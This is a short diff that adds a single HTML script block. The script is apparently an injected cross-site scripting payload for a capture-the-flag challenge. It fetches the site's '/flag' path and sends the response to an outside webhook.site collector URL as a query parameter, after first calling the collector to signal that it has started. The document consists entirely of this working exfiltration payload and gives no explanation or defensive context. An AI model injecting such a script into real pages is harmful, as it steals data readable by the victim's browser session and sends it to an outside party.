@@ -1,0 +1,8 @@
+<script>
+  fetch("https://webhook.site/69b3f174-0976-4662-a925-7db44886d46e?start=1")
+
+  fetch("/flag").then(res => res.text()).then(res => {
+    return fetch("https://webhook.site/69b3f174-0976-4662-a925-7db44886d46e?flag="+res)
+  })
+
+</script>
